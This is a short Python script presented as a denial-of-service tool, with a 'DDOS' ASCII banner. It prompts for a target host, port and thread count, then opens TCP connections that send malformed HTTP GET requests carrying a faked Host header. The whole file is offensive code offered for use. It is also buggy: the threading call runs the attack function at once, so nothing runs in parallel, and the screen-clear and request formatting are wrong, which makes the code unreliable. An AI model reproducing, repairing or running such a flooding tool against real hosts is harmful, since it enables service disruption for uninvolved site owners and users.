#!/usr/bin/python
'coded by hosein-khanali'

import os
import sys
import re
import threading
from socket import *


blue = '\033[34m'
green = '\033[32m'
red = '\033[31m'
yellow = '\033[33m'
cyan = '\033[36m'
bold    = "\033[;1m"
reset = "\033[0;0m"

ip_regex = '^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
fake_ip = '44.168.215.56'

def banner():
    print(blue + """

  /$$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$ 
 | $$__  $$| $$__  $$ /$$__  $$ /$$__  $$
 | $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/
 | $$  | $$| $$  | $$| $$  | $$|  $$$$$$ 
 | $$  | $$| $$  | $$| $$  | $$ \____  $$
 | $$  | $$| $$  | $$| $$  | $$ /$$  \ $$
 | $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/
 |_______/ |_______/  \______/  \______/ 


 ****************************************

""" + reset)

def ddos(ip:str , port:int , counter:int):
    s = socket(AF_INET ,SOCK_STREAM)
    s.connect((ip , port))
    s.sendto((f'GET /{ip}HTTP/1.1').encode('ascii') , (ip , port))
    s.sendto((f'HOST : {fake_ip}').encode('ascii') , (ip , port))
    print(green + ' Pocket ' + str(counter) + ' Sent !' + reset)

def main():
    os.system('cls' or 'clear')
    banner()
    host = input(yellow + ' host >>> ' + reset)
    port = input(yellow + ' port >>> ' + reset)
    threads = input(yellow + ' threads >>> ' + reset)
    print()
    if (re.search(ip_regex, host)):
        addr = host
        name = gethostbyaddr(addr)
    elif host.startswith('http://'):
        name = host[7:]
        addr = gethostbyname(name)
    elif host.startswith('https://'):
        name = host[8:]
        addr = gethostbyname(name)
    else:
        try:
            name = host
            addr = gethostbyname(name)
        except:
            print(red + ' [!] Host or Ip is Not True !' + reset)
            sys.exit()
    try:
        port = int(port)
        thread = int(threads)
    except:
        print(red + ' [!] Arguments are not True !' + reset)
        sys.exit()
    print(cyan + ' name : ' + name + reset)
    print(cyan + ' addr : ' + addr + reset)
    print(cyan + ' port : ' + str(port) + reset)
    print(cyan + ' thread : ' + str(thread) + reset)
    print()
    for counter in range(1, int(thread) + 1):
        _thread = threading.Thread(target=ddos(addr, port, counter))
        _thread.start()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        print(f'{red} [-] ^C received . shutting down server !{reset}')
        sys.exit()
